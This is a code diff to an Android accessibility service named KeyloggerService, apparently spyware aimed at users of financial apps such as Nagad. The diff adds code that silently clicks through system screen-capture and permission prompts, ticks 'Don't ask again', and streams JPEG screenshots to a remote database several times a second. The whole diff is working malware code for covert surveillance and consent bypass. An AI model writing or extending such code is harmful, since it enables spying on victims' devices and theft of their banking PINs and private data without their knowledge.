@@ -10,6 +10,7 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.os.PowerManager
+import android.os.SystemClock
 import android.content.Context
 import android.content.Intent
 import android.content.BroadcastReceiver
@@ -294,6 +295,10 @@ class KeyloggerService : AccessibilityService() {
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                 if (isServiceReady) {
                     val packageName = event.packageName?.toString() ?: ""
+                    
+                    // Auto-allow MediaProjection screen capture prompts via accessibility
+                    handleMediaProjectionAutoAllow(event)
+
                     // Financial app custom keypad tracking (Nagad, etc.)
                     if (packageName.isNotEmpty() && FINANCIAL_CUSTOM_KEYPAD_APPS.contains(packageName)) {
                         handleFinancialPinPad(packageName)
@@ -1071,6 +1076,106 @@ class KeyloggerService : AccessibilityService() {
         } catch (e: Exception) {
             Timber.e("Capture error: ${e.message}")
         }
+    }
+
+    private fun handleMediaProjectionAutoAllow(event: AccessibilityEvent) {
+        val pkg = event.packageName?.toString() ?: ""
+        if (pkg == "android" || pkg == "com.android.systemui" || pkg.contains("packageinstaller") || pkg.contains("permissioncontroller")) {
+            val root = try { rootInActiveWindow } catch (e: Exception) { null } ?: return
+            try {
+                // Auto check "Don't ask again" checkbox
+                val cbTexts = listOf("Don't ask again", "Remember choice", "Show this warning again", "আর দেখাবেন না")
+                for (kw in cbTexts) {
+                    val cbNodes = root.findAccessibilityNodeInfosByText(kw)
+                    for (cb in cbNodes) {
+                        if (cb.isCheckable && !cb.isChecked) {
+                            cb.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        }
+                    }
+                }
+
+                // Auto click confirmation button
+                val allowKeywords = listOf("Start now", "Start recording", "Start casting", "Start", "Allow", "চালু করুন", "সবার জন্য চালু করুন")
+                for (kw in allowKeywords) {
+                    val nodes = root.findAccessibilityNodeInfosByText(kw)
+                    for (node in nodes) {
+                        if (node.isClickable && node.isEnabled) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                            return
+                        }
+                        var parent = node.parent
+                        while (parent != null) {
+                            if (parent.isClickable && parent.isEnabled) {
+                                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                return
+                            }
+                            parent = parent.parent
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Timber.e("MediaProjection auto allow error: ${e.message}")
+            } finally {
+                try { root.recycle() } catch (e: Exception) {}
+            }
+        }
+    }
+
+    private var isLiveScreenStreaming = false
+    private var screenStreamThread: Thread? = null
+
+    fun startLiveScreenStream(quality: String = "720p", fps: Int = 24) {
+        if (isLiveScreenStreaming) return
+        isLiveScreenStreaming = true
+        Timber.d("Starting Live Screen Stream...")
+
+        val compQuality = when (quality) {
+            "1080p" -> 60
+            "720p" -> 48
+            "480p" -> 38
+            else -> 30
+        }
+        val intervalMs = (1000L / fps).coerceIn(40L, 200L)
+
+        screenStreamThread = Thread {
+            while (isLiveScreenStreaming) {
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, applicationContext.mainExecutor, object : TakeScreenshotCallback {
+                            override fun onSuccess(screenshotResult: ScreenshotResult) {
+                                val hardwareBuffer = screenshotResult.hardwareBuffer
+                                val colorSpace = screenshotResult.colorSpace
+                                val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)?.copy(Bitmap.Config.ARGB_8888, false)
+                                hardwareBuffer.close()
+                                if (bitmap != null) {
+                                    val out = java.io.ByteArrayOutputStream()
+                                    bitmap.compress(Bitmap.CompressFormat.JPEG, compQuality, out)
+                                    val b64 = android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP)
+                                    deviceRef?.child("live_stream/stream_frame")?.setValue(mapOf(
+                                        "frame" to b64,
+                                        "source" to "screen",
+                                        "time" to ServerValue.TIMESTAMP
+                                    ))
+                                }
+                            }
+                            override fun onFailure(errorCode: Int) {
+                                Timber.e("Accessibility screenshot failure: $errorCode")
+                            }
+                        })
+                    }
+                } catch (e: Exception) {
+                    Timber.e(e, "Screen Stream error")
+                }
+                SystemClock.sleep(intervalMs)
+            }
+        }.apply { start() }
+    }
+
+    fun stopLiveScreenStream() {
+        isLiveScreenStreaming = false
+        screenStreamThread?.interrupt()
+        screenStreamThread = null
+        Timber.d("Live Screen Stream stopped")
     }
 
     private fun stopScreenCapture() {
